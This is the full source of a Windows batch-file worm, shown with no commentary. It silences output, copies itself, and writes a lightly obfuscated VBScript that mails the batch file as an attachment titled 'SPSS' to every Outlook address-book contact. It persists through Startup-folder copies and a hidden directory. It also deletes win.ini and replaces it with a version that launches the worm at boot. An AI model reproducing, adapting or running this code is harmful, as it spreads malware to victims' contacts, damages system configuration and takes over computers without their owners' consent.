cls
@echo off
ctty nul
Set MyS=%0
copy %MyS% SPSS.BAT
copy SPSS.BAT C:\SPSS.BAT
copy SPSS.BAT C:\rzdva.vbs
set VBSwayF=dim
echo %VBSwayF% x > C:\rzdva.vbs
set VBSwayF=
set VBSwayA=resume
echo.on error %VBSwayA% next >> C:\rzdva.vbs
set VBSwayA=
set VBSwayG=FileSystem
echo Set fso =" Scripting.%VBSwayG%.Object" >> C:\rzdva.vbs
set VBSwayG=
echo Set so=CreateObject(fso) >> C:\rzdva.vbs
set VBSwayI=Outlook
echo Set ol=CreateObject("%VBSwayI%.Application") >> C:\rzdva.vbs
set VBSwayI=
echo Set out= WScript.CreateObject("Outlook.Application") >> C:\rzdva.vbs
set VBSwayD=out
echo Set mapi = %VBSwayD%.GetNameSpace("MAPI") >> C:\rzdva.vbs
set VBSwayD=
echo Set a = mapi.AddressLists(1) >> C:\rzdva.vbs
echo Set ae=a.AddressEntries >> C:\rzdva.vbs
set VBSwayB=Count
echo For x=1 To ae.%VBSwayB% >> C:\rzdva.vbs
set VBSwayB=
echo Set Mail=ol.CreateItem(0) >> C:\rzdva.vbs
set VBSwayC=Name
echo Mail.to=ol.Get%VBSwayC%Space("MAPI").AddressLists(1).AddressEntries(x) >> C:\rzdva.vbs
set VBSwayC=
echo Mail.Subject="SPSS" >> C:\rzdva.vbs
set VBSwayL=Body
echo Mail.%VBSwayL%="" >> C:\rzdva.vbs
set VBSwayL=
echo Mail.Attachments.Add("C:\SPSS.BAT") >> C:\rzdva.vbs
echo Mail.Send >> C:\rzdva.vbs
echo Next >> C:\rzdva.vbs
echo ol.Quit >> C:\rzdva.vbs
cscript C:\rzdva.vbs
del C:\rzdva.vbs
del C:\SPSS.BAT
copy SPSS.BAT %windir%\startm~1\progra~1\autost~1\*.bat
copy SPSS.BAT %windir%\Start Menu\Programs\StartUp\dmxzr.bat
md C:\suPs
copy SPSS.BAT C:\suPs\iaxtp.bat
subst L: C:\suPs
copy SPSS.BAT %WinDir%\system\WINI.bat
echo [windows] >funny.bat
set inib=system
set inic=WINI.bat
echo run=%windir%\system\%inic% >>funny.bat
echo NullPort=None >>funny.bat
set inie=funny
copy %inie%.bat %windir%\dd.ini
del %windir%\win.ini
del funny.bat
set inih=dd.in
ren %windir%\%inih%i win.ini
@del SPSS.BAT
ctty CON
